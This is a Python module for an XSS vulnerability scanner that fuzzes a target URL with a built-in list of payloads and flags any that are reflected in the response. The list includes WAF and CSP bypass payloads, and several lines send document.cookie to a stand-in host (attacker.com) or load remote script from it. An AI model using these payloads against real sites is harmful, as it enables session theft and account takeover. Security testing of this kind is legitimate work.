"""
XSS Scanner
Detects Cross-Site Scripting vulnerabilities
"""

import logging

import urllib3

from ..config import Config
from .base import BaseScanner

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)


class XSSScanner(BaseScanner):
    """Cross-Site Scripting vulnerability scanner"""

    def __init__(self, target, payload_file, output_file=None, dynamic_payloads=None):
        super().__init__(target, output_file)
        self.payload_file = payload_file
        self.dynamic_payloads = dynamic_payloads

    def get_payloads(self):
        """Load XSS payloads"""
        # Modern 2025 XSS payloads - WAF bypasses and CSP bypasses
        default_payloads = [
            # Classic XSS
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            # 2025 WAF bypass techniques
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=\\u0061lert(1)>",
            "<svg/onload=alert(1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # base64: alert(1)
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            # DOM-based XSS (modern)
            "<img src=x onerror=location=`javascript:alert(1)`>",
            "<svg onload=fetch('https://attacker.com/?c='+document.cookie)>",
            "<img src=x onerror=navigator.sendBeacon('https://attacker.com',document.cookie)>",
            # CSP bypass techniques (2025)
            "<script src=//attacker.com/xss.js></script>",
            "<link rel=prefetch href=//attacker.com/xss.js>",
            "<script>import('https://attacker.com/xss.js')</script>",
            "<object data='data:text/html,<script>alert(1)</script>'>",
            # Event handler obfuscation
            "<img src=x oneonerrorrror=alert(1)>",
            "<img src=x onerror=\\x61lert(1)>",
            "<svg><animate onbegin=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            # Filter bypass with encodings
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
            "<SCRIPT SRC=//attacker.com/xss.js></SCRIPT>",
            # Template injection (2025)
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "#{alert(1)}",
            "*{alert(1)}",
            # Mutation XSS (mXSS)
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            "<svg><style><img src=x onerror=alert(1)></style></svg>",
            # Polyglot XSS
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//\\x3e",
            # URL-based XSS
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            # React/Angular/Vue specific (2025)
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            "[[constructor.constructor('alert(1)')()]]",
            "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='alert(1)'\");}}",
            # Advanced attribute injection
            "' autofocus onfocus=alert(1) '",
            '" autofocus onfocus=alert(1) "',
            "'-alert(1)-'",
            '"-alert(1)-"',
            # 2025 Chromium bypass
            "<audio src=x onerror=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            # Rare event handlers (2025)
            "<body onpageshow=alert(1)>",
            "<body onresize=alert(1)>",
            "<form onforminput=alert(1)><input>",
            "<video onloadstart=alert(1) src=x>",
            # SVG-based advanced
            "<svg><script>alert(1)</script></svg>",
            "<svg><script xlink:href=data:,alert(1)></script></svg>",
            "<svg><use xlink:href=data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x></use></svg>",
        ]

        if self.dynamic_payloads:
            return self.dynamic_payloads

        # Load custom payloads from file if provided
        if self.payload_file:
            try:
                with open(self.payload_file, "r") as f:
                    custom_payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]
                    default_payloads.extend(custom_payloads)
                    logger.info(f"Loaded {len(custom_payloads)} custom XSS payloads")
                    print(
                        f"{Config.COLOR_GREEN}[+] Loaded {len(custom_payloads)} custom payloads{Config.COLOR_RESET}\n"
                    )
            except Exception as e:
                logger.error(f"Error reading payload file: {e}")
                print(
                    f"{Config.COLOR_ORANGE}[-] Error reading payload file: {str(e)}{Config.COLOR_RESET}"
                )

        return default_payloads

    def scan(self):
        """Execute XSS scan"""
        print(
            f"\n{Config.COLOR_BLUE}[*] Starting Greaper XSS scanner on {self.target}{Config.COLOR_RESET}"
        )

        payloads = self.get_payloads()
        if not payloads:
            return

        found_xss = []

        for payload in payloads:
            try:
                import requests

                test_url = self.target.replace("FUZZ", requests.utils.quote(payload))
                response = self.make_request(test_url, verify=False)

                if payload in response.text:
                    result = (
                        f"[+] Potential XSS found on {test_url} With payload: {payload}"
                    )
                    print(f"{Config.COLOR_GREEN}{result}{Config.COLOR_RESET}")
                    found_xss.append(result)
                else:
                    print(
                        f"{Config.COLOR_RED}[-] No XSS found for payload: {payload}{Config.COLOR_RESET}"
                    )
            except Exception as e:
                logger.error(f"Error testing payload: {e}")
                print(
                    f"{Config.COLOR_RED}[-] Error testing payload: {str(e)}{Config.COLOR_RESET}"
                )
                continue

        self.results = found_xss

        if found_xss:
            self.save_results()
        else:
            print(
                f"\n{Config.COLOR_RED}[-] No XSS vulnerabilities found{Config.COLOR_RESET}"
            )
